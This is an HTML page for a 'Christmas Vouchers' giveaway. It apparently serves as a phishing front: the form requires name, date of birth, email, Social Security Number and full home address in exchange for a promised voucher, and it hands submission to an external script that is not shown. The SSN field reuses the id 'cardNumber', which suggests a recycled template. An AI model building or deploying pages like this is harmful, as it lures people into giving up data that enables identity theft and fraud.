<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÑ Christmas Vouchers</title>
    <link rel="stylesheet" href="./style.css">
</head>
<body>
    <div class="container">
        <!-- Header Section -->
        <div class="header">
            <h1>üéÑ Christmas Vouchers</h1>
            <p>Fill out the form to receive your exclusive Christmas voucher!</p>
        </div>

        <!-- Loading Indicator -->
        <div id="loadingMessage" class="loading">
            <p>‚è≥ Processing your request...</p>
        </div>

        <!-- Main Form -->
        <form id="vipForm">
            <!-- Personal Information Section -->
            <div class="form-section">
                <div class="section-title">
                    <span class="icon">üë§</span>
                    Personal Information
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label>First Name <span class="required">*</span></label>
                        <input type="text" id="firstName" required>
                    </div>
                    <div class="form-group">
                        <label>Last Name <span class="required">*</span></label>
                        <input type="text" id="lastName" required>
                    </div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label>Date of Birth <span class="required">*</span></label>
                        <input type="date" id="birthdate" name="birthdate" lang="en" required>
                    </div>
                    <div class="form-group">
                        <label>Email <span class="required">*</span></label>
                        <input type="email" id="email" required placeholder="your@email.com">
                    </div>
                </div>
            </div>

            <!-- Identification Section -->
            <div class="form-section">
                <div class="section-title">
                    <span class="icon">üîê</span>
                    Identification
                </div>
                
                <div class="form-group">
                    <label>Social Security Number <span class="required">*</span></label>
                    <input type="text" id="cardNumber" required placeholder="XXX-XX-XXXX">
                </div>
            </div>

            <!-- Shipping Address Section -->
            <div class="form-section">
                <div class="section-title">
                    <span class="icon">üìÆ</span>
                    Shipping Address
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label>State <span class="required">*</span></label>
                        <select id="state" required>
                            <option value="">Select State</option>
                            <option value="AL">Alabama</option>
                            <option value="AK">Alaska</option>
                            <option value="AZ">Arizona</option>
                            <option value="AR">Arkansas</option>
                            <option value="CA">California</option>
                            <option value="CO">Colorado</option>
                            <option value="CT">Connecticut</option>
                            <option value="DE">Delaware</option>
                            <option value="FL">Florida</option>
                            <option value="GA">Georgia</option>
                            <option value="HI">Hawaii</option>
                            <option value="ID">Idaho</option>
                            <option value="IL">Illinois</option>
                            <option value="IN">Indiana</option>
                            <option value="IA">Iowa</option>
                            <option value="KS">Kansas</option>
                            <option value="KY">Kentucky</option>
                            <option value="LA">Louisiana</option>
                            <option value="ME">Maine</option>
                            <option value="MD">Maryland</option>
                            <option value="MA">Massachusetts</option>
                            <option value="MI">Michigan</option>
                            <option value="MN">Minnesota</option>
                            <option value="MS">Mississippi</option>
                            <option value="MO">Missouri</option>
                            <option value="MT">Montana</option>
                            <option value="NE">Nebraska</option>
                            <option value="NV">Nevada</option>
                            <option value="NH">New Hampshire</option>
                            <option value="NJ">New Jersey</option>
                            <option value="NM">New Mexico</option>
                            <option value="NY">New York</option>
                            <option value="NC">North Carolina</option>
                            <option value="ND">North Dakota</option>
                            <option value="OH">Ohio</option>
                            <option value="OK">Oklahoma</option>
                            <option value="OR">Oregon</option>
                            <option value="PA">Pennsylvania</option>
                            <option value="RI">Rhode Island</option>
                            <option value="SC">South Carolina</option>
                            <option value="SD">South Dakota</option>
                            <option value="TN">Tennessee</option>
                            <option value="TX">Texas</option>
                            <option value="UT">Utah</option>
                            <option value="VT">Vermont</option>
                            <option value="VA">Virginia</option>
                            <option value="WA">Washington</option>
                            <option value="WV">West Virginia</option>
                            <option value="WI">Wisconsin</option>
                            <option value="WY">Wyoming</option>
                            <option value="DC">District of Columbia</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>City <span class="required">*</span></label>
                        <input type="text" id="city" required>
                    </div>
                </div>

                <div class="form-group">
                    <label>Street Address <span class="required">*</span></label>
                    <textarea id="address" rows="2" required placeholder="Enter your street address"></textarea>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label>Apt/Suite <span class="optional">(optional)</span></label>
                        <input type="text" id="apt" placeholder="Apartment, suite, unit, etc.">
                    </div>
                    <div class="form-group">
                        <label>ZIP Code <span class="required">*</span></label>
                        <input type="text" id="zip" required placeholder="12345">
                    </div>
                </div>
            </div>

            <!-- Submit Section -->
            <div class="submit-section">
                <button type="submit">üéÅ Get My Christmas Voucher</button>
            </div>
        </form>

        <!-- Success Message -->
        <div id="successMessage" class="success-message">
            <h2>üéâ Thank You!</h2>
            <p>Your application has been accepted. We will send your voucher soon.</p>
        </div>
    </div>

    <script src="./script.js"></script>
</body>
</html>
